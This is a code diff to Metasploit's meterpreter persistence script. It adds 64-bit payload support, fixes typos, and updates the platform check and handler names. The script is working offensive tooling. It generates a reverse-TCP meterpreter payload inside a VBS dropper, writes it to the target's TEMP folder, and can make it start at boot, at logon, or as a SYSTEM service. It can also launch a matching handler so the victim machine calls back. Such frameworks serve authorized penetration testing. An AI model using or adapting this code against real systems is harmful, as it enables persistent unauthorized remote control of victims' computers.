@@ -4,7 +4,7 @@
 
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
-# If you'd like to imporve this script, please try to port it as a post
+# If you'd like to improve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
@@ -35,12 +35,11 @@ script_on_target = nil
   "-X"  => [ false,  "Automatically start the agent when the system boots"],
   "-U"  => [ false,  "Automatically start the agent when the User logs on"],
   "-S"  => [ false,  "Automatically start the agent on boot as a service (with SYSTEM privileges)"],
-  "-A"  => [ false,  "Automatically start a matching multi/handler to connect to the agent"],
+  "-A"  => [ false,  "Automatically start a matching exploit/multi/handler to connect to the agent"],
   "-L"  => [ true,   "Location in target host to write payload to, if none \%TEMP\% will be used."],
   "-T"  => [ true,   "Alternate executable template to use"],
   "-P"  => [ true,   "Payload to use, default is windows/meterpreter/reverse_tcp."]
 )
-meter_type = client.platform
 
 ################## Function Declarations ##################
 
@@ -54,7 +53,7 @@ end
 
 # Wrong Meterpreter Version Message Function
 #-------------------------------------------------------------------------------
-def wrong_meter_version(meter = meter_type)
+def wrong_meter_version(meter)
   print_error("#{meter} version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
 end
@@ -72,13 +71,23 @@ end
 
 # Function for Creating persistent script
 #-------------------------------------------------------------------------------
-def create_script(delay,altexe,raw)
-  if altexe
-    vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw,
-                                          {:persist => true, :delay => delay, :template => altexe})
+def create_script(delay,altexe,raw,is_x64)
+  if is_x64
+    if altexe
+      vbs = ::Msf::Util::EXE.to_win64pe_vbs(@client.framework, raw,
+                                            {:persist => true, :delay => delay, :template => altexe})
+    else
+      vbs = ::Msf::Util::EXE.to_win64pe_vbs(@client.framework, raw,
+                                            {:persist => true, :delay => delay})
+    end
   else
-    vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw,
-                                          {:persist => true, :delay => delay})
+    if altexe
+      vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw,
+                                            {:persist => true, :delay => delay, :template => altexe})
+    else
+      vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw,
+                                            {:persist => true, :delay => delay})
+    end
   end
   print_status("Persistent agent script is #{vbs.length} bytes long")
   return vbs
@@ -116,19 +125,19 @@ def write_script_to_target(target_dir,vbs)
   if target_dir
     tempdir = target_dir
   else
-    tempdir = @client.fs.file.expand_path("%TEMP%")
+    tempdir = @client.sys.config.getenv('TEMP')
   end
   tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
   fd = @client.fs.file.new(tempvbs, "wb")
   fd.write(vbs)
   fd.close
   print_good("Persistent Script written to #{tempvbs}")
-  tempvbs = tempvbs.gsub(/\\/, '//')      # Escape windows pathname separators.
-  file_local_write(@clean_up_rc, "rm #{tempvbs}\n")
+  # Escape windows pathname separators.
+  file_local_write(@clean_up_rc, "rm #{tempvbs.gsub(/\\/, '//')}\n")
   return tempvbs
 end
 
-# Function for setting multi handler for autocon
+# Function for setting exploit/multi/handler for autocon
 #-------------------------------------------------------------------------------
 def set_handler(selected_payload,rhost,rport)
   print_status("Starting connection handler at port #{rport} for #{selected_payload}")
@@ -144,7 +153,7 @@ def set_handler(selected_payload,rhost,rport)
     'Payload'        => mul.datastore['PAYLOAD'],
     'RunAsJob'       => true
   )
-  print_good("Multi/Handler started!")
+  print_good("exploit/multi/handler started!")
 end
 
 # Function to execute script on target and return the PID of the process
@@ -217,17 +226,20 @@ end
 }
 
 # Check for Version of Meterpreter
-wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
-print_status("Running Persistance Script")
+unless client.platform == 'windows' && [ARCH_X86, ARCH_X64].include?(client.arch)
+  wrong_meter_version(client.session_type)
+end
+
+print_status("Running Persistence Script")
 # Create undo script
 @clean_up_rc = log_file()
 print_status("Resource file for cleanup created at #{@clean_up_rc}")
 # Create and Upload Payload
 raw = create_payload(payload_type, rhost, rport)
-script = create_script(delay, altexe, raw)
+script = create_script(delay, altexe, raw, payload_type.include?('/x64/'))
 script_on_target = write_script_to_target(target_dir, script)
 
-# Start Multi/Handler
+# Start exploit/multi/handler
 if autoconn
   set_handler(payload_type, rhost, rport)
 end
